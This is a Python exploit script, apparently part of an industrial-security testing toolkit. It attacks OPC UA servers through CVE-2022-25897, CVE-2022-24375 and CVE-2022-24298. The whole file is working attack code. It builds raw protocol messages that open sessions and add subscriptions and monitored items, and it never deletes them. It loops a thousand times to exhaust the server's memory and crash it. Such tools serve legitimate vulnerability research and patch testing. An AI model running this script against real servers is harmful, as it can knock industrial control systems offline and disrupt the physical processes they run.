# Unlimited Persistent Subscription Attack
#   Create many sessions with subscriptions and monitored items without ever deleting the monitored items. Eventually these allocations will consume all the available process memory which will lead to a crash and denial of service condition.
#
# CVEs:
#   - CVE-2022-25897: https://github.com/eclipse/milo/security/advisories/GHSA-fph9-f5r6-vhqf
#   - CVE-2022-24375: https://security.snyk.io/vuln/SNYK-JS-NODEOPCUA-2988725
#   - CVE-2022-24298: https://security.snyk.io/vuln/SNYK-UNMANAGED-FREEOPCUAFREEOPCUA-2988720
#

import datetime

from protocol import *
from config import *

def get_server_node_children(opcua):
    # Prepare browse request (with server node id)
    message_header = opcua.build_opcua_message_header()

    message_body = b""
    message_body += b"\x01\x00"  # Type ID - Expanded Node ID four byte encoded number 0x01 with namespace index 0
    message_body += b"\x0f\x02"  # Create Subscription request
    message_body += OBJECT.build(opcua.auth_id)  # Auth token
    browse_body = bytes.fromhex("0a1509d3d06dd8010400000000000000ffffffffe8030000000000000000000000000000000000000000000000010000000100cd0800000000002101000000003f000000")
    message = message_header + message_body + browse_body
    parsed_message = OPCUA_MESSAGE.parse(message)
    # Return only nodes that are of type 'variable'
    parsed_message.opc_data.object.object.browse_descriptions[0].node_class_mask.mask_view_type = 0
    parsed_message.opc_data.object.object.browse_descriptions[0].node_class_mask.mask_data_type = 0
    parsed_message.opc_data.object.object.browse_descriptions[0].node_class_mask.mask_reference_type = 0
    parsed_message.opc_data.object.object.browse_descriptions[0].node_class_mask.mask_variable_type = 0
    parsed_message.opc_data.object.object.browse_descriptions[0].node_class_mask.mask_object_type = 0
    parsed_message.opc_data.object.object.browse_descriptions[0].node_class_mask.mask_method = 0
    parsed_message.opc_data.object.object.browse_descriptions[0].node_class_mask.mask_variable = 1
    parsed_message.opc_data.object.object.browse_descriptions[0].node_class_mask.mask_object = 0

    parsed_message.opc_data.object.object.browse_descriptions[0].result_mask.res_reference_type = 0
    parsed_message.opc_data.object.object.browse_descriptions[0].result_mask.res_is_forward = 0
    parsed_message.opc_data.object.object.browse_descriptions[0].result_mask.res_node_class = 0
    parsed_message.opc_data.object.object.browse_descriptions[0].result_mask.res_browse_name = 0
    parsed_message.opc_data.object.object.browse_descriptions[0].result_mask.res_display_name = 0
    parsed_message.opc_data.object.object.browse_descriptions[0].result_mask.res_type_definition = 0
    parsed_message.opc_data.object.object.browse_descriptions[0].result_mask_not_used = 0x0000

    message = OPCUA_MESSAGE.build(parsed_message)
    print("[-] Sending MSG Request - CreateSubscription")
    browse_response = opcua.send_recv_parse(message)
    browse_items = browse_response.opc_data.object.object.browse_results[0].references
    only_ids = [x.expanded_node_id.identifier_numeric for x in browse_items]
    return only_ids


def send_message_create_persistent_subscriptions_generic(server_details):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    server_children = get_server_node_children(opcua)
    raw_monitored_item = b'\x01\x00\xce1\r\x00\x00\x00\xff\xff\xff\xff\x00\x00\xff\xff\xff\xff\x02\x00\x00\x00\xdc\x10\x00\x00\x00\x00\x00\x00\x00@o@\x00\x00\x00\x01\x00\x00\x00\x01'
    parsed_monitored_item = MONITORED_ITEM_FOR_CREATE_REQUES.parse(raw_monitored_item)
    monitor_items = []
    server_children = server_children
    for node_id in server_children:
        parsed_monitored_item.item_to_monitor.node_id.identifier_numeric = node_id
        monitor_items.append(MONITORED_ITEM_FOR_CREATE_REQUES.build(parsed_monitored_item))

    monitor_items_bytes = b"\x02\x00\x00\x00" + struct.pack("I", len(monitor_items)) + b"".join(monitor_items)
    for i in range(9):
        # Prepare add subscription
        message_header = opcua.build_opcua_message_header()

        message_body = b""
        message_body += b"\x01\x00"  # Type ID - Expanded Node ID four byte encoded number 0x01 with namespace index 0
        message_body += b"\x13\x03"  # Create Subscription request (631)
        message_body += OBJECT.build(opcua.auth_id)  # Auth token
        create_subscription_body = bytes.fromhex("81f893276ce7d7014e000000ff030000ffffffff000000000000000000000000408f40e80300000a0000000000000001ff")
        message = message_header + message_body + create_subscription_body
        # Send num_requests times
        print("[-] Sending MSG Request - CreateSubscription")
        create_sub_response = opcua.send_recv(message, should_recv=True)
        subscription_id = create_sub_response[-20: -16]

        # Create Monitored Item
        # This item is specific to unified demo server
        message_header = opcua.build_opcua_message_header()

        message_body = b""
        message_body += b"\x01\x00"  # Type ID - Expanded Node ID four byte encoded number 0x01 with namespace index 0
        message_body += b"\xef\x02"  # Create AddMonitoredItem request
        message_body += OBJECT.build(opcua.auth_id)  # Auth token
        monitor_items_body = bytes.fromhex(
            "22086332a1ead70148000000ff030000ffffffff00000000000000") + subscription_id + monitor_items_bytes
        message = message_header + message_body + monitor_items_body
        print("[-] Sending MSG Request - Create Monitored Items")
        create_response = opcua.send_recv(message, should_recv=True)

    opcua.close_connection(should_delete_subscriptions=False)
    opcua.close(close_session=False)



def attack(server_details, count=1000):
    for i in range(count):
        send_message_create_persistent_subscriptions_generic(server_details)
